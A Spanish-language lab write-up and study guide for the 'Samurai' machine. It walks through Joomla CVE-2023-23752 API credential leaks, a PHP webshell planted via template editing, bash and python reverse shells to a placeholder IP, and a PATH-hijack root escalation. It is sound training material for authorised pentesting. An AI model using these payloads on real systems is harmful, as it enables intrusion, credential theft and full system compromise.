# Guía técnica — Conceptos del lab Samurai (y cómo reutilizarlos)

Documento de aprendizaje. Explica el *porqué* de cada paso de la cadena de Samurai,
para reconocer y explotar patrones parecidos en otros labs y en Bug Bounty real.

Índice:
1. Metodología general (el flujo que seguimos)
2. Enumeración web y el problema del "catch-all"
3. Fingerprinting de un CMS (Joomla como ejemplo)
4. CVE-2023-23752 a fondo
5. Reutilización de credenciales
6. De admin a RCE: por qué editar una plantilla ejecuta código
7. Reverse shells y estabilización de TTY
8. Escalada de privilegios: SUID, sudo y PATH hijacking
9. Errores comunes y cómo depurarlos
10. Checklist reutilizable

---

## 1. Metodología general

El flujo de un engagement (y de casi cualquier máquina) es siempre el mismo:

```
Recon → Hallazgo → Validación → Explotación → Post-explotación → Reporte
```

- **Recon:** ¿qué hay expuesto? (puertos, servicios, versiones, rutas).
- **Hallazgo:** algo que *parece* vulnerable o interesante.
- **Validación:** confirmar que lo es (sin asumir). Aquí se descartan falsos positivos.
- **Explotación:** convertir el hallazgo en acceso o impacto real.
- **Post-explotación:** moverse, escalar, documentar el alcance.
- **Reporte:** reproducible, con impacto y remediación.

Regla de oro: **nunca asumas, valida**. Un `200 OK` no significa que una página exista;
una versión vulnerable "sobre el papel" no implica explotable hasta probarlo.

---

## 2. Enumeración web y el "catch-all"

### Qué es un catch-all
Un servidor puede estar configurado para devolver **siempre la misma página** (normalmente la home,
con código 200) ante *cualquier* ruta, exista o no. Esto rompe el fuzzing ingenuo: todo "parece existir".

### Cómo detectarlo
Pide una ruta que **seguro no existe** (`/basura_inventada`) y compara. Si devuelve lo mismo
(mismo código y **mismo tamaño en bytes**) que una ruta real, hay catch-all.

```bash
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://OBJETIVO/ruta_inventada_xyz
```

### Cómo fuzzear igualmente
Filtra por el tamaño de la respuesta basura. Si la home mide 3185 bytes, excluyes ese tamaño
y solo verás lo que es **realmente distinto**:

```bash
# gobuster
gobuster dir -u http://OBJETIVO -w wordlist.txt -x php,txt,html --exclude-length 3185

# feroxbuster
feroxbuster -u http://OBJETIVO -w wordlist.txt -S 3185

# ffuf (filtra por size)
ffuf -u http://OBJETIVO/FUZZ -w wordlist.txt -fs 3185
```

Filtros equivalentes según herramienta: `-fs` (ffuf) / `-S` (ferox) / `--exclude-length` (gobuster).
También puedes filtrar por nº de palabras (`-fw`) o líneas (`-fl`) si el tamaño varía un poco.

### Lección transversal
Cuando "todo da 200", no es que todo exista: es que **nada** existe y el servidor miente.
Cambia de criterio (tamaño, palabras, contenido) en vez de fiarte del código HTTP.

---

## 3. Fingerprinting de un CMS

Reconocer el software por su **estructura de archivos** es clave. Cada CMS deja una huella:

| CMS | Carpetas/archivos reveladores |
|---|---|
| **Joomla** | `administrator/`, `components/`, `modules/`, `plugins/`, `templates/`, `libraries/`, `/api/`, `administrator/manifests/files/joomla.xml` |
| **WordPress** | `wp-admin/`, `wp-content/`, `wp-includes/`, `wp-login.php`, `readme.html` |
| **Drupal** | `sites/`, `core/`, `CHANGELOG.txt`, `/user/login` |

### Sacar la versión exacta
Casi siempre hay un archivo con la versión en texto plano. En Joomla:

```bash
curl -s http://OBJETIVO/administrator/manifests/files/joomla.xml   # <version>X.Y.Z</version>
curl -s http://OBJETIVO/language/en-GB/en-GB.xml
```

La versión exacta es lo que te permite buscar **CVEs aplicables** con precisión
(no "Joomla", sino "Joomla 4.2.5").

---

## 4. CVE-2023-23752 a fondo

### Qué es
Un fallo de **control de acceso incorrecto** (Broken Access Control) en Joomla **4.0.0 – 4.2.7**.
Ciertos endpoints de la API REST que deberían requerir autenticación son accesibles **sin ella**.

### Por qué ocurre
La API comprobaba mal la autorización en algunas rutas con el parámetro `public=true`.
El resultado: un atacante anónimo puede leer endpoints internos.

### Endpoints clave
```bash
# Configuración (incluye credenciales de BD en claro)
curl -s -H 'Accept: application/vnd.api+json' \
  'http://OBJETIVO/api/index.php/v1/config/application?public=true'

# Usuarios (nombres, emails, grupos)
curl -s -H 'Accept: application/vnd.api+json' \
  'http://OBJETIVO/api/index.php/v1/users?public=true'
```

### El detalle de la cabecera `Accept`
La API de Joomla sigue el estándar **JSON:API** y exige el MIME `application/vnd.api+json`.
Con `application/json` responde *"Could not match accept header"*. Ese mensaje **no es un fallo tuyo**:
indica que el endpoint existe y procesa la petición, solo le falta el `Accept` correcto.

### Impacto
- Credenciales de BD en claro.
- Enumeración de usuarios (incluido quién es Super Admin).
- Si MySQL estuviera expuesto (3306), acceso directo a la BD. En este lab estaba en localhost,
  así que el valor real estuvo en la **reutilización** de la contraseña.

---

## 5. Reutilización de credenciales (credential reuse)

Uno de los patrones más rentables y realistas. Una contraseña filtrada en un sitio
suele estar repetida en otros:

- contraseña de BD → panel de administración del CMS
- contraseña de un servicio → usuario del sistema (SSH)
- credenciales de un dump → otros servicios de la empresa

**Qué probar siempre con una contraseña encontrada:**
```bash
# panel web
#   /administrator (Joomla), /wp-login.php (WP), etc. con los usuarios enumerados

# SSH con varios usuarios candidatos
ssh usuario@OBJETIVO           # usa nombres del endpoint de users, 'admin', el del CMS...
ssh -o PubkeyAuthentication=no usuario@OBJETIVO   # fuerza login por password
```

Lección: una credencial no vale solo donde la encontraste. **Pruébala en todas partes.**

---

## 6. De admin a RCE: por qué editar una plantilla ejecuta código

### La idea
En un CMS, las **plantillas/temas** son archivos **PHP que el servidor ejecuta**.
Si el panel de administración te deja editar (o crear) esos archivos, puedes escribir
PHP arbitrario que se ejecutará al solicitar la página. Eso es **RCE autenticado**.

### La webshell mínima
```php
<?php echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; ?>
```
- `system()` ejecuta un comando del sistema y muestra su salida.
- `$_REQUEST` acepta tanto GET (`?cmd=id`) como POST (más sigiloso, no queda en logs de URL).
- `echo "<pre>"` fuerza que la salida se vea aunque el HTML la "colapse".

### Por qué crear un archivo nuevo es más fiable que editar `index.php`
El `index.php` de una plantilla lo **carga el framework** del CMS internamente; a veces no se
sirve directamente ni ejecuta tu código donde esperas. Un **archivo nuevo** (`shell.php`) dentro
de la carpeta de la plantilla **sí** se sirve directo en `/templates/NOMBRE/shell.php`.

### Rutas según el tipo de plantilla (Joomla)
- Plantilla de **sitio**: `http://OBJETIVO/templates/NOMBRE/shell.php`
- Plantilla de **administrador**: `http://OBJETIVO/administrator/templates/NOMBRE/shell.php`

Si editas una pero llamas a la ruta de la otra → no funciona. Comprueba ambas.

---

## 7. Reverse shells y estabilización de TTY

### Por qué una reverse shell
La webshell por URL es incómoda (un comando por petición, sin interactividad).
Una **reverse shell** hace que el objetivo se conecte *a ti*, dándote una terminal real.

### Montaje
```bash
# 1) En tu máquina: listener
nc -lvnp 4444

# 2) Tu IP de la VPN del lab (interfaz tun/utun, suele ser 10.x)
ifconfig | grep -A3 utun | grep "inet "

# 3) En el objetivo (vía webshell), elige una que funcione:
bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
Por URL, el payload va **URL-encoded** (espacios `%20`, `>` `%3E`, `&` `%26`, etc.).

### Estabilizar la TTY (shell usable: flechas, Ctrl+C, autocompletado)
```bash
# en la shell recibida
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z para suspender; en tu máquina:
stty raw -echo; fg
# Enter, y de vuelta en la shell:
export TERM=xterm
```

---

## 8. Escalada de privilegios: SUID, sudo y PATH hijacking

### Primeros comandos tras el foothold
```bash
id; whoami; hostname
sudo -l                                  # ¿qué puedo ejecutar como root?
find / -perm -4000 -type f 2>/dev/null   # binarios SUID
cat /etc/crontab; ls -la /etc/cron.*     # tareas programadas
```

### Qué es SUID
Un binario con el bit **SUID** (`-rwsr-xr-x`, la `s`) se ejecuta con los privilegios de su
**propietario**, no de quien lo lanza. Si el dueño es root, corre como root aunque lo ejecute `www-data`.

### El fallo de Samurai: binario que llama a otro "por nombre"
`DbMaria` ejecutaba internamente:
```
mariadb-dump --socket=... -u root <arg> > /tmp/backup.sql
```
Llama a `mariadb-dump` **sin ruta absoluta**. El sistema lo busca recorriendo el **PATH**.
Si controlas el PATH, puedes anteponer una carpeta con un `mariadb-dump` **falso** tuyo,
y el binario SUID ejecutará *tu* script **como root**.

### Por qué sudo NO servía pero ejecutarlo directo SÍ
- Por **sudo**, la config `env_reset` + `secure_path` **resetea tu PATH** a uno seguro →
  se ejecuta el `mariadb-dump` legítimo. PATH hijack bloqueado.
- Ejecutándolo **sin sudo**, aprovechando el **bit SUID** directamente, **tu PATH sobrevive**
  → se ejecuta tu `mariadb-dump` falso como root.

Moraleja: cuando un binario es *a la vez* SUID y está en sudoers, prueba **ambas vías**;
las protecciones de `sudo` no aplican al ejecutarlo directamente.

### El exploit
```bash
cd /tmp
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /tmp/mariadb-dump   # payload: SUID a bash
chmod +x /tmp/mariadb-dump
export PATH=/tmp:$PATH            # mi carpeta primero en el PATH
/opt/backup/DbMaria Dbjoomla     # el SUID ejecuta mi mariadb-dump como root
/bin/bash -p                     # -p preserva el euid root
id                               # euid=0
cat /root/root.txt
```

### Por qué `chmod +s /bin/bash` + `bash -p`
`chmod +s /bin/bash` pone SUID a bash. Normalmente bash "deja caer" privilegios al arrancar,
pero con `-p` (privileged) **los conserva**, dándote una shell con euid root.

### Por qué fallaron las otras ideas (y qué aprender)
- **Inyección de comandos** en el argumento: no había shell intermedia; el argumento llegaba
  como nombre de BD a `mariadb-dump` (`error 1102`). Para que haya inyección tiene que existir
  un intérprete de shell por medio (`system`, backticks, `sh -c`...).

### GTFOBins
Para binarios SUID/sudo conocidos, **https://gtfobins.github.io** lista la forma de abusarlos.
Busca siempre ahí el binario que te aparezca en `sudo -l` o en el listado SUID.

---

## 9. Errores comunes y cómo depurarlos

| Síntoma | Causa probable | Solución |
|---|---|---|
| `zsh: command not found: #` | zsh interpreta el `#` de los comentarios | No pegues comentarios; o usa bash |
| URL partida en `?` o `&` | el shell interpreta esos caracteres | **Comillas simples** en toda la URL |
| `Could not match accept header` | falta el MIME correcto | `Accept: application/vnd.api+json` |
| Webshell devuelve vacío | archivo no ejecuta PHP / ruta equivocada | Test con `<?php echo "TEST"; ?>`; crea archivo nuevo; prueba ambas rutas de template |
| `system()` no responde | función deshabilitada | Prueba `shell_exec`, `passthru`, backticks; revisa `disable_functions` |
| Reverse shell no conecta | IP/puerto mal, o firewall | Usa tu IP de la **VPN** (utun), revisa el listener, prueba otro puerto (80/443) |

Técnica de depuración universal: **aísla la variable**. ¿Es la ruta o la ejecución?
¿Es el shell o el servidor? Un test mínimo (imprimir un string) responde eso en segundos.

---

## 10. Checklist reutilizable

**Recon**
- [ ] `nmap` top-ports → luego `-sC -sV` sobre abiertos → luego `-p-` completo
- [ ] Web: `curl -sI`, `whatweb`, `robots.txt`
- [ ] ¿Catch-all? Pide una ruta inventada y compara tamaño
- [ ] Fuzzing filtrando el tamaño basura

**Web / CMS**
- [ ] Identificar CMS por estructura de carpetas
- [ ] Sacar versión exacta (archivos `.xml`, `readme`, `CHANGELOG`)
- [ ] Buscar CVEs para esa versión concreta
- [ ] Probar endpoints de API / fugas de info conocidas

**Credenciales**
- [ ] Toda credencial encontrada → probar en panel, SSH, otros servicios
- [ ] Varios usuarios candidatos (los enumerados + genéricos)

**RCE**
- [ ] Panel admin → editar/crear plantilla PHP → webshell
- [ ] Test mínimo de ejecución antes de complicar
- [ ] Reverse shell + estabilizar TTY

**Post-explotación / privesc**
- [ ] `id`, `sudo -l`, SUID (`find / -perm -4000`), cron, capabilities
- [ ] Binarios que llaman a otros por nombre → PATH hijack
- [ ] Consultar GTFOBins
- [ ] Probar SUID y sudo por separado (protecciones distintas)

**Reporte**
- [ ] Reproducible paso a paso
- [ ] Impacto real explicado
- [ ] PoC simplificada, sin info sensible innecesaria
- [ ] Remediación concreta

---

*Material de formación. Uso educativo en entornos autorizados.*
